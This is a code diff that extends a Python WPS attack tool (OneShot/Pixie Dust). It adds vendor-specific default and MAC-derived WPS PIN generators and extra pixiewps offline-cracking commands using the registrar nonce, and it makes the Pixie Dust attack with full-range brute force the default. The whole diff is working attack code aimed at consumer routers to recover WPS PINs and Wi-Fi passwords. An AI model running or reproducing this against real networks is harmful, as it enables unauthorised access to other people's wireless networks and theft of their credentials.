@@ -366,42 +366,82 @@ class WPSpin:
         self.ALGO_EMPTY = 1
         self.ALGO_STATIC = 2
 
-        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
-                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
-                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
-                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
-                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
-                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
-                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
-                      'pinArcadyan': {'name': 'Arcadyan (Belkin/Arcadyan)', 'mode': self.ALGO_MAC, 'gen': self.pinArcadyan},
-                      'pinEasyBox': {'name': 'Vodafone EasyBox (Arcadyan)', 'mode': self.ALGO_MAC, 'gen': self.pinEasyBox},
-                      'pinLivebox': {'name': 'Orange Livebox (Arcadyan)', 'mode': self.ALGO_MAC, 'gen': self.pinLivebox},
-                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
-                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
-                      'pinActiontecQ1000': {'name': 'Actiontec Q1000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
-                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
-                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
-                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
-                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
-                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
-                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
-                      'pinNetgearCG3000': {'name': 'Netgear CG3000 (Optus)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
-                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
-                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
-                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
-                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
-                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
-                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
-                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
-                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
-                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
-                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
-                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
-                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
-                      'pinThomsonTG782T': {'name': 'Thomson TG782T', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7842178},
-                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
-                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
-                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}
+        self.algos = {
+            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
+            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
+            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32, 'skip_checksum': True},
+            'pin36': {'name': '36-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin36},
+            'pin40': {'name': '40-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin40, 'skip_checksum': True},
+            'pin44': {'name': '44-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin44},
+            'pin48': {'name': '48-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin48},
+            'pinRev48': {'name': 'Reverse 48-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pinRev48},
+            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
+            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
+            'pinBelkin': {'name': 'Belkin PIN', 'mode': self.ALGO_MAC, 'gen': self.pinBelkin},
+            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
+            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
+            'pinArcadyan': {'name': 'Arcadyan (Belkin/Arcadyan)', 'mode': self.ALGO_MAC, 'gen': self.pinArcadyan},
+            'pinEasyBox': {'name': 'Vodafone EasyBox (Arcadyan)', 'mode': self.ALGO_MAC, 'gen': self.pinEasyBox},
+            'pinLivebox': {'name': 'Orange Livebox (Arcadyan)', 'mode': self.ALGO_MAC, 'gen': self.pinLivebox},
+            'pinInvNic': {'name': 'Inv NIC to PIN', 'mode': self.ALGO_MAC, 'gen': self.pinInvNic},
+            'pinNic2': {'name': 'NIC * 2', 'mode': self.ALGO_MAC, 'gen': self.pinNicTimes2},
+            'pinNic3': {'name': 'NIC * 3', 'mode': self.ALGO_MAC, 'gen': self.pinNicTimes3},
+            'pinOuiPlusNic': {'name': 'OUI + NIC', 'mode': self.ALGO_MAC, 'gen': self.pinOuiPlusNic},
+            'pinOuiMinusNic': {'name': 'OUI - NIC', 'mode': self.ALGO_MAC, 'gen': self.pinOuiMinusNic},
+            'pinOuiXorNic': {'name': 'OUI ^ NIC', 'mode': self.ALGO_MAC, 'gen': self.pinOuiXorNic},
+            'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: '', 'skip_checksum': True},
+            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '12345670', 'skip_checksum': True},
+            'pinActiontecQ1000': {'name': 'Actiontec Q1000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '12345670', 'skip_checksum': True},
+            'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '28296628', 'skip_checksum': True},
+            'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '12345670', 'skip_checksum': True},
+            'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '78945670', 'skip_checksum': True},
+            'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '00000000', 'skip_checksum': True},
+            'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '20172581', 'skip_checksum': True},
+            'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '45678912', 'skip_checksum': True},
+            'pinNetgearCG3000': {'name': 'Netgear CG3000 (Optus)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '12345678', 'skip_checksum': True},
+            'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '63969270', 'skip_checksum': True},
+            'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '28096610', 'skip_checksum': True},
+            'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '20172581', 'skip_checksum': True},
+            'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '12345678', 'skip_checksum': True},
+            'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '00000000', 'skip_checksum': True},
+            'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '45678912', 'skip_checksum': True},
+            'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '28096610', 'skip_checksum': True},
+            'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '77149133', 'skip_checksum': True},
+            'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '77149133', 'skip_checksum': True},
+            'pinOnline': {'name': 'Online', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '12349876', 'skip_checksum': True},
+            'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '12345678', 'skip_checksum': True},
+            'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '41422354', 'skip_checksum': True},
+            'pinThomsonTG782T': {'name': 'Thomson TG782T', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '78421783', 'skip_checksum': True},
+            'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '08143156', 'skip_checksum': True},
+            'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '10293847', 'skip_checksum': True},
+            'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: '12349876', 'skip_checksum': True},
+            # Legacy static presets (checksum will be applied)
+            'pinCiscoLegacy': {'name': 'Cisco (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
+            'pinActiontecQ1000Legacy': {'name': 'Actiontec Q1000 (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
+            'pinBrcm1Legacy': {'name': 'Broadcom 1 (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
+            'pinBrcm2Legacy': {'name': 'Broadcom 2 (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
+            'pinBrcm3Legacy': {'name': 'Broadcom 3 (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
+            'pinBrcm4Legacy': {'name': 'Broadcom 4 (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
+            'pinBrcm5Legacy': {'name': 'Broadcom 5 (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
+            'pinBrcm6Legacy': {'name': 'Broadcom 6 (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
+            'pinNetgearCG3000Legacy': {'name': 'Netgear CG3000 (Optus, legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
+            'pinAirc1Legacy': {'name': 'Airocon 1 (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
+            'pinAirc2Legacy': {'name': 'Airocon 2 (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
+            'pinDSL2740RLegacy': {'name': 'DSL-2740R (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
+            'pinRealtek1Legacy': {'name': 'Realtek 1 (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
+            'pinRealtek2Legacy': {'name': 'Realtek 2 (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
+            'pinRealtek3Legacy': {'name': 'Realtek 3 (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
+            'pinUpvelLegacy': {'name': 'Upvel (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
+            'pinUR814ACLegacy': {'name': 'UR-814AC (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
+            'pinUR825ACLegacy': {'name': 'UR-825AC (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
+            'pinOnlime': {'name': 'Onlime (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
+            'pinEdimaxLegacy': {'name': 'Edimax (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
+            'pinThomsonLegacy': {'name': 'Thomson (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
+            'pinThomsonTG782TLegacy': {'name': 'Thomson TG782T (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7842178},
+            'pinHG532xLegacy': {'name': 'HG532x (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
+            'pinH108LLegacy': {'name': 'H108L (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
+            'pinONOLegacy': {'name': 'CBN ONO (legacy)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}
+        }
 
     @staticmethod
     def checksum(pin):
@@ -428,8 +468,8 @@ class WPSpin:
         if algo not in self.algos:
             raise ValueError('Invalid WPS pin algorithm')
         pin = self.algos[algo]['gen'](mac)
-        if algo == 'pinEmpty':
-            return pin
+        if self.algos[algo].get('skip_checksum'):
+            return str(pin).zfill(8)
         pin = pin % 10000000
         pin = str(pin) + str(self.checksum(pin))
         return pin.zfill(8)
@@ -534,6 +574,7 @@ class WPSpin:
             'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
             'pinUR814AC': ('D4BF7F60',),
             'pinUR825AC': ('D4BF7F5',),
+            'pinOnline': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
             'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
             'pinEdimax': ('801F02', '00E04C'),
             'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
@@ -557,6 +598,33 @@ class WPSpin:
     def pin32(self, mac):
         return mac.integer % 0x100000000
 
+    def pin36(self, mac):
+        mac_bytes = self._mac_bytes(mac)
+        pin = ((mac_bytes[0] << 28) | (mac_bytes[1] << 20) |
+               (mac_bytes[2] << 12) | (mac_bytes[3] << 4) |
+               (mac_bytes[4] >> 4))
+        return pin % 10000000
+
+    def pin40(self, mac):
+        mac_bytes = self._mac_bytes(mac)
+        pin = int.from_bytes(mac_bytes[1:], 'big') % 100000000
+        return str(pin).zfill(8)
+
+    def pin44(self, mac):
+        mac_bytes = self._mac_bytes(mac)
+        pin = int.from_bytes(mac_bytes, 'big') % 100000000
+        return pin
+
+    def pin48(self, mac):
+        mac_bytes = self._mac_bytes(mac)
+        pin = int.from_bytes(mac_bytes, 'big') % 10000000
+        return pin
+
+    def pinRev48(self, mac):
+        mac_bytes = list(reversed(self._mac_bytes(mac)))
+        pin = int.from_bytes(mac_bytes, 'big') % 10000000
+        return pin
+
     def pinDLink(self, mac):
         nic = mac.integer & 0xFFFFFF
         pin = nic ^ 0x55AA55
@@ -573,6 +641,10 @@ class WPSpin:
     def pinDLink1(self, mac):
         mac.integer += 1
         return self.pinDLink(mac)
+
+    def pinBelkin(self, mac):
+        nic = mac.integer & 0xFFFFFF
+        return (nic ^ 0x55AA55) % 10000000
 
     def pinASUS(self, mac):
         b = [int(i, 16) for i in mac.string.split(':')]
@@ -591,6 +663,10 @@ class WPSpin:
         + (((b[1] + b[2]) % 10) * 100000)\
         + (((b[0] + b[1]) % 10) * 1000000)
         return pin
+
+    @staticmethod
+    def _mac_bytes(mac):
+        return [int(i, 16) for i in mac.string.split(':')]
 
     @staticmethod
     def _mac_nibbles(mac):
@@ -639,6 +715,33 @@ class WPSpin:
     def pinLivebox(self, mac):
         return self._arcadyan_pin(mac)
 
+    def pinInvNic(self, mac):
+        nic = mac.integer & 0xFFFFFF
+        return (~nic & 0xFFFFFF) % 10000000
+
+    def pinNicTimes2(self, mac):
+        nic = mac.integer & 0xFFFFFF
+        return (nic * 2) % 10000000
+
+    def pinNicTimes3(self, mac):
+        nic = mac.integer & 0xFFFFFF
+        return (nic * 3) % 10000000
+
+    def pinOuiPlusNic(self, mac):
+        oui = (mac.integer >> 24) & 0xFFFFFF
+        nic = mac.integer & 0xFFFFFF
+        return (oui + nic) % 10000000
+
+    def pinOuiMinusNic(self, mac):
+        oui = (mac.integer >> 24) & 0xFFFFFF
+        nic = mac.integer & 0xFFFFFF
+        return (oui - nic) % 10000000
+
+    def pinOuiXorNic(self, mac):
+        oui = (mac.integer >> 24) & 0xFFFFFF
+        nic = mac.integer & 0xFFFFFF
+        return (oui ^ nic) % 10000000
+
 def recvuntil(pipe, what):
     s = ''
     while True:
@@ -662,6 +765,7 @@ class PixiewpsData:
         self.e_hash2 = ''
         self.authkey = ''
         self.e_nonce = ''
+        self.r_nonce = ''
 
     def clear(self):
         self.__init__()
@@ -670,14 +774,39 @@ class PixiewpsData:
         return (self.pke and self.pkr and self.e_nonce and self.authkey
                 and self.e_hash1 and self.e_hash2)
 
-    def get_pixie_cmd(self, full_range=False):
-        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
-                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
-                    self.pke, self.pkr, self.e_hash1,
-                    self.e_hash2, self.authkey, self.e_nonce)
-        if full_range:
-            pixiecmd += ' --force'
-        return pixiecmd
+    def got_m3_only(self):
+        return (self.pke and self.pkr and self.r_nonce and self.e_hash1
+                and self.e_hash2)
+
+    def get_pixie_cmds(self, full_range=False):
+        primary = None
+        secondary = []
+
+        def _maybe_force(cmd):
+            return f"{cmd} --force" if full_range else cmd
+
+        if self.pke and self.pkr and self.e_hash1 and self.e_hash2:
+            if self.authkey and self.e_nonce:
+                pixiecmd = (
+                    "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} "
+                    "--authkey {} --e-nonce {}".format(
+                        self.pke, self.pkr, self.e_hash1,
+                        self.e_hash2, self.authkey, self.e_nonce
+                    )
+                )
+                primary = _maybe_force(pixiecmd)
+
+            if self.r_nonce:
+                pixiecmd = (
+                    "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} "
+                    "--r-nonce {}".format(
+                        self.pke, self.pkr, self.e_hash1,
+                        self.e_hash2, self.r_nonce
+                    )
+                )
+                secondary.append(_maybe_force(pixiecmd))
+
+        return primary, secondary
 
 class ConnectionStatus:
     def __init__(self):
@@ -797,6 +926,11 @@ class Companion:
                 assert(len(self.pixie_creds.e_nonce) == 16*2)
                 if pixiemode:
                     print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
+            elif 'Registrar Nonce' in line and 'hexdump' in line:
+                self.pixie_creds.r_nonce = get_hex(line)
+                assert(len(self.pixie_creds.r_nonce) == 16*2)
+                if pixiemode:
+                    print('[P] R-Nonce: {}'.format(self.pixie_creds.r_nonce))
             elif 'DH own Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pkr = get_hex(line)
                 assert(len(self.pixie_creds.pkr) == 192*2)
@@ -870,7 +1004,7 @@ class Companion:
 
     def __runPixiewps(self, full_range=False):
         self.__print_with_indicators('*', 'Running Pixiewps…')
-        base_cmd = self.pixie_creds.get_pixie_cmd(full_range)
+        primary_cmd, extra_cmds = self.pixie_creds.get_pixie_cmds(full_range)
 
         def _run(cmd):
             print(cmd)
@@ -887,13 +1021,25 @@ class Companion:
                         return pin
             return None
 
-        pin = _run(base_cmd)
-        if pin:
-            return pin
-        for mode in range(1, 8):
-            pin = _run(f"{base_cmd} --mode {mode}")
+        mode_limit = 3 if full_range else 7
+
+        if primary_cmd:
+            pin = _run(primary_cmd)
             if pin:
                 return pin
+            for mode in range(1, mode_limit + 1):
+                pin = _run(f"{primary_cmd} --mode {mode}")
+                if pin:
+                    return pin
+
+        for base_cmd in extra_cmds:
+            pin = _run(base_cmd)
+            if pin:
+                return pin
+            for mode in range(1, mode_limit + 1):
+                pin = _run(f"{base_cmd} --mode {mode}")
+                if pin:
+                    return pin
         return False
 
     def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
@@ -1052,7 +1198,7 @@ class Companion:
                         pass
             return True
         elif pixiemode:
-            if self.pixie_creds.got_all():
+            if self.pixie_creds.got_all() or self.pixie_creds.got_m3_only():
                 pin = self.__runPixiewps(pixieforce)
                 if pin:
                     while True:
@@ -1389,7 +1535,8 @@ MODEL_ALGO_HINTS = [
     ("UR-825AC", "pinUR825AC"),
     ("UPVEL", "pinUpvel"),
     ("EDIMAX", "pinEdimax"),
-    ("ONLIME", "pinOnlime"),
+    ("ONLIME", "pinOnline"),
+    ("ONLINE", "pinOnline"),
     ("AIROCON", "pinAirocon"),
     ("CISCO", "pinCisco"),
 ]
@@ -1480,15 +1627,13 @@ def try_pin_sequence(comp, bssid, pins, pixie=False, delay=None):
             time.sleep(delay)
     return False
 def build_parser():
-    parser = argparse.ArgumentParser(description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg', epilog='Example: %(prog)s --interface wlan0 --bssid 00:90:4C:C1:AC:21 --pixie-dust')
+    parser = argparse.ArgumentParser(description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg', epilog='Example: %(prog)s --interface wlan0 --bssid 00:90:4C:C1:AC:21')
     parser.add_argument('--interface', type=str, required=True, help='Name of the interface to use')
     parser.add_argument('--bssid', type=str, help='BSSID of the target AP')
     parser.add_argument(
         '--pin',
         type=str,
-        help='Use the specified pin (arbitrary string or 4/8 digit pin; requires --bssid and --pixie-dust)')
-    parser.add_argument('--pixie-dust', action='store_true', help='Run Pixie Dust attack')
-    parser.add_argument('--pixie-force', action='store_true', help='Run Pixiewps with --force option (bruteforce full range)')
+        help='Use the specified pin (arbitrary string or 4/8 digit pin; requires --bssid)')
     parser.add_argument('--push-button-connect', action='store_true', help='Run WPS push button connection')
     parser.add_argument('--delay', type=float, help='Set the delay between pin attempts')
     parser.add_argument('--write', action='store_true', help='Write credentials to the file on success')
@@ -1497,6 +1642,7 @@ def build_parser():
     parser.add_argument('--reverse-scan', action='store_true', help='Reverse order of networks in the list of networks. Useful on small displays')
     parser.add_argument('--mtk-wifi', action='store_true', help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.')
     parser.add_argument('--verbose', action='store_true', help='Verbose output')
+    parser.set_defaults(pixie_dust=True, pixie_force=True)
     return parser
 
 def usage():
@@ -1506,8 +1652,8 @@ if __name__ == '__main__':
     parser = build_parser()
     args = parser.parse_args()
 
-    if args.pin and (not args.bssid or not args.pixie_dust):
-        parser.error('--pin can only be used together with --bssid and --pixie-dust')
+    if args.pin and not args.bssid:
+        parser.error('--pin can only be used together with --bssid')
 
     if sys.hexversion < 0x03060F0:
         die("The program requires Python 3.6 and above")
